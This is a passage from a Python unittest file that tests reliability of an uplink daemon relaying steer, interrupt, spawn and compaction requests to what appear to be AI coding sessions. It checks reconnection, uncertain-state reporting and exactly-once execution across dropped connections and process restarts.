            self.assertEqual(self.mod.ops("interrupt"), [])
            # Republished on every connect until acknowledged.
            count = len(self.hub.messages())
            self.hub.drop()
            self.assertIsNotNone(self.reconnected(count))
            self.assertIsNotNone(wait_for(lambda: len(self.posted(steer["nonce"])) >= 2, 15), "sent again")
            self.ack(steer)
            time.sleep(0.5)
            sent = len(self.posted(steer["nonce"]))
            count = len(self.hub.messages())
            self.hub.drop()
            self.assertIsNotNone(self.reconnected(count))
            time.sleep(1.0)
            self.assertEqual(len(self.posted(steer["nonce"])), sent, "acknowledged: not sent again")

    def test_b_a_cut_after_execution_shows_uncertain_then_resolves_executed_once(self):
        self.mod.turn = "turn-b"
        self.mod.hold = 3.0
        before = len(self.mod.ops("steer"))
        steer = self.send(self.rpc("steer", {"session": self.sid, "text": "keep the old column name"}))
        self.assertTrue(wait_for(lambda: len(self.mod.ops("steer")) > before, 15), "it reached the session")
        count = len(self.hub.messages())
        self.hub.drop()
        if self.local():
            self.assertTrue(wait_for(lambda: "uncertain" in [s for s, _ in self.states(steer["nonce"])], 15),
                            "uncertain on the hub while the machine is away: %s" % self.states(steer["nonce"]))
        self.assertIsNotNone(self.reconnected(count))
        o = self.outcome(steer)
        self.assertEqual(o, {"state": "done", "result": {"row": self.mod.rows[-1]}}, "then resolved")
        self.assertEqual(len(self.mod.ops("steer")) - before, 1, "executed once")
        self.ack(steer)

    def restart_uplink(self):
        old = Uplink.uplink
        old.send_signal(signal.SIGKILL)
        old.wait(10)
        count = len(self.hub.messages())
        Uplink.uplink = self.spawn([CLI, "daemon", "uplink"])
        self.assertIsNotNone(self.reconnected(count), "the new uplink is connected")

    def test_c_a_restart_between_execution_and_report_resolves_executed_once(self):
        # Killed after the claim, while the session runs the steer: the new
        # uplink finds the steer's row in the transcript.
        self.mod.turn = "turn-c"
        self.mod.hold = 2.0
        before = len(self.mod.ops("steer"))
        steer = self.send(self.rpc("steer", {"session": self.sid, "text": "and the migration"}))
        self.assertTrue(wait_for(lambda: len(self.mod.ops("steer")) > before, 15), "it reached the session")
        self.restart_uplink()
        if self.local():
            self.assertIn("uncertain", [s for s, _ in self.states(steer["nonce"])], "uncertain while it was away")
        o = self.outcome(steer, timeout=45)
        self.assertEqual(o, {"state": "done", "result": {"row": self.mod.rows[-1]}}, "reconciled from its trace")
        self.assertEqual(len(self.mod.ops("steer")) - before, 1, "executed once")
        self.ack(steer)
        if not self.local():
            # Killed after the outcome was kept, its report held by the hub:
            # the new uplink sends it after its hello.
            self.mod.hold = 0.0
            self.mod.turn = "turn-c2"
            tsp.call(self.hub.url, "POST", "/control/post-fault", {"faults": [{"fault": "hold", "has": "rpc-result"}]})
            n = len(self.mod.ops("interrupt"))
            intr = self.send(self.rpc("interrupt", {"session": self.sid}))
            self.assertTrue(wait_for(lambda: [p for p in self.hub.state()["posted"] if p["status"] == "held"], 15),
                            "the report reached the hub and is held there")
            self.restart_uplink()
            tsp.call(self.hub.url, "POST", "/control/release", {})
            o = self.outcome(intr)
            self.assertEqual(o["result"]["turnId"], "turn-c2")
            self.assertEqual(len(self.mod.ops("interrupt")) - n, 1, "executed once")
            self.ack(intr)

    def test_d_a_spawn_retried_with_its_nonce_after_a_cut_yields_one_session(self):
        with open(os.path.join(self.claude, "bg-sleep"), "w") as f:
            f.write("3")
        try:
            before = len(launches(self.claude))
            spawn = self.send(self.rpc("spawn", {"checkout": self.root, "brief": "write the release notes"}))
            self.assertTrue(wait_for(lambda: len(launches(self.claude)) > before, 30), "the launch began")
            count = len(self.hub.messages())
            self.hub.drop()
            self.assertIsNotNone(self.reconnected(count))
            o = self.outcome(spawn, timeout=60)
            self.assertEqual(o["state"], "done", o)
            self.send(spawn)  # the browser's retry, with its nonce
            if self.local():
                self.assertTrue(wait_for(lambda: len([s for s, _ in self.states(spawn["nonce"]) if s == "done"]) >= 2,
                                         15), "answered again: %s" % self.states(spawn["nonce"]))
            else:
                self.assertTrue(wait_for(lambda: len(self.posted(spawn["nonce"])) >= 2, 15), "answered again")
            self.assertEqual(self.outcome(spawn), o, "the same answer")
            time.sleep(1.0)
            self.assertEqual(len(launches(self.claude)) - before, 1, "one launch")
            self.assertEqual([s["current"] for s in sminos.seats() if s.get("rpc_nonce") == spawn["nonce"]],
                             [o["result"]["session"]], "one session")
            self.ack(spawn)
        finally:
            os.unlink(os.path.join(self.claude, "bg-sleep"))

    def test_e_a_compaction_reaches_the_browsers_as_dx4_compact(self):
        count = len(self.hub.messages())
        compact = self.send(self.rpc("compact", {"session": self.sid}))
        self.assertEqual(self.outcome(compact), {"state": "done", "result": {"at": "now"}})
        ms = self.hub.wait(lambda ms: len([m for m in ms[count:] if m["kind"] == "compact"]) >= 2 and ms, timeout=20)
        self.assertIsNotNone(ms, "the compaction's progress, relayed")
        self.assertEqual([m["body"] for m in ms[count:] if m["kind"] == "compact"],
                         [{"rpc": compact["nonce"], "phase": "start"},
                          {"rpc": compact["nonce"], "phase": "end", "tokensBefore": 9000, "tokensAfter": 1200}])
        self.ack(compact)


if __name__ == "__main__":
    try:
        unittest.main(verbosity=2)
    finally:
        shutil.rmtree(T, ignore_errors=True)
